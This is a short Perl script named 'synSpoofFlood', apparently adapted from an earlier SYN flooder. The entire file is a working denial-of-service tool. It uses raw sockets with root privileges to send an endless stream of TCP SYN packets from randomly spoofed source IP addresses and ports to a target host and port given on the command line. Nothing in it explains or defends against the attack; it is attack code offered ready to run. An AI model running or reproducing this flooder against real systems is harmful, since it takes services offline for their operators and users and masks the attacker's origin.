#!/usr/bin/perl
# synSpoofFlood
# Author: Lucas Allan
#
# Based on Simple SYN Flooder by iphelix
# Requires perl, Net::RawIP module, and root privileges
#
# www.lucasallan.com
#
 
use Net::RawIP;
 
sub geraIP(){
    $range = 255;
    $iA = int(rand($range));
    $iB = int(rand($range));
    $iC = int(rand($range));
    $iD = int(rand($range));
 
    return $iA . "." . $iB . "." . $iC . "." . $iD;
}
 
sub attack(){
   ($dst,$port) = @ARGV;
   $a = new Net::RawIP;
   while(1) {
      $src_port = rand(65534)+1;
      $src = geraIP();
      $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
      $a->send;
   }
}
if($#ARGV == 1) {
    attack();
 
} else {
   print "Target Port\n";
}